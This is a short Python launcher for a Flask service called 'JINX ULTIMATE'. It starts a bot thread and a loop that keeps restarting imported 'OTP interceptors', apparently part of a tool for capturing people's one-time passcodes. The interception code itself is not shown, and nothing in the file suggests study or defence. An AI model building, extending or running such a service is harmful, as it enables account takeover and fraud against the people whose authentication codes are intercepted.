import os
import threading
from flask import Flask
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

@app.route('/')
def home():
    return "🔥 JINX ULTIMATE - SUPER SIMPLE BOT! 😈"

@app.route('/health')
def health():
    return {"status": "healthy", "service": "jinx"}

def run_super_simple_bot():
    """Run SUPER SIMPLE bot"""
    try:
        from super_simple_bot import main
        main()
    except Exception as e:
        logger.error(f"Super simple bot error: {e}")

def run_interceptors():
    """Run interceptors"""
    while True:
        try:
            from otp_interceptor import start_otp_interceptors
            import asyncio
            asyncio.run(start_otp_interceptors())
        except Exception as e:
            logger.error(f"Interceptor crashed: {e}")
            import time
            time.sleep(10)

if __name__ == "__main__":
    # Initialize database
    try:
        from database import init_db
        init_db()
        logger.info("✅ Database initialized")
    except Exception as e:
        logger.error(f"❌ Database init failed: {e}")

    # Setup API routes
    try:
        from api_routes import setup_routes
        setup_routes(app)
        logger.info("✅ API routes setup")
    except Exception as e:
        logger.error(f"❌ API routes setup failed: {e}")

    # Start services
    bot_thread = threading.Thread(target=run_super_simple_bot, daemon=True)
    interceptor_thread = threading.Thread(target=run_interceptors, daemon=True)
    
    bot_thread.start()
    interceptor_thread.start()
    
    logger.info("🤖 SUPER SIMPLE BOT STARTED!")
    
    # Run Flask
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
